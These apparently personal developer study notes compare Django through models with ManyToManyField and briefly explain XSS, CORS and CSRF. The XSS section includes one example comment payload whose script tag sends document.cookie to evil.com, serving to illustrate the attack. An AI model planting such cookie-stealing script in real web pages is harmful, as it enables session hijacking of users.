
## Why Use a Connector Model Instead of ManyToManyField?
    1. Extra fields: You can add additional attributes to the relationship (e.g., quantity, status, etc.).
    2. Better control: You have more control over how relationships are managed, queried, and updated.
    3. Flexibility: The connector model provides more flexibility for complex relationships (e.g., filtering, sorting).
    4. Performance: You can optimize queries using select_related and prefetch_related, reducing the number of queries.
    5. Complex filtering: Easier to write complex queries and filters on relationships.
    6. Better database integrity: Allows you to manage the intermediate table structure, constraints, and indexing.
   
## When Might to Use ManyToManyField?
    1. The relationship between two models is purely many-to-many, and you don't need to store additional data on the relationship itself.
    2. when don’t need complex filtering, ordering, or aggregating based on the relationship.

## XSS (Cross-Site Scripting)
    XSS is a vulnerability where an attacker injects malicious scripts (usually JavaScript) into web pages viewed by other users.
    {
      "post_id": 42,
      "comment": "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"
    }

## CORS (Cross-Origin Resource Sharing)
    CORS is a browser security feature that controls which domains can access resources (like APIs) from a different domain using JavaScript.
    It protects your backend API from being accessed by unauthorized frontend sites — but only for JavaScript-based requests.
    

## CSRF(Cross-Site Request Forgery)
    - CSRF tricks a user into submitting a request they didn’t intend to, often using their logged-in credentials.
    - A <form> submission (CSRF attack): browser still sends it — CORS does nothing here.
    - CORS only applies to cross-origin JavaScript (AJAX/fetch) requests, not to form submissions.


